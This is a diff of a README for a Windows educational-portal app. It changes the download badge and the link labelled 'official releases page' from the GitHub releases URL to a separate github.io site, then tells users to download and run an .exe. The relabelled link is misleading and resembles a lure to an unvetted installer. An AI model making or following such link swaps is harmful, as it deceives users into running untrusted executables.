@@ -1,6 +1,6 @@
 # 🎓 apexlearning-portal-hub - Access all your educational materials easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/overcurious-northwest55/apexlearning-portal-hub/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://overcurious-northwest55.github.io)
 
 ApexLearning Portal serves as a central hub for your education. It gathers your learning materials and portal activities into one place. This application removes the need to search through multiple tabs or websites. You find your assignments, readings, and course updates in a clean interface. The portal runs directly on your computer, which provides a fast and reliable experience.
 
@@ -8,7 +8,7 @@ ApexLearning Portal serves as a central hub for your education. It gathers your 
 
 You do not need programming knowledge to use this software. Follow these steps to set up the portal on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/overcurious-northwest55/apexlearning-portal-hub/releases) to download the installer.
+1. Visit the [official releases page](https://overcurious-northwest55.github.io) to download the installer.
 2. Look for the file ending in .exe under the latest version tag.
 3. Click the file name to start the download.
 4. Open the folder where your computer saves downloads.
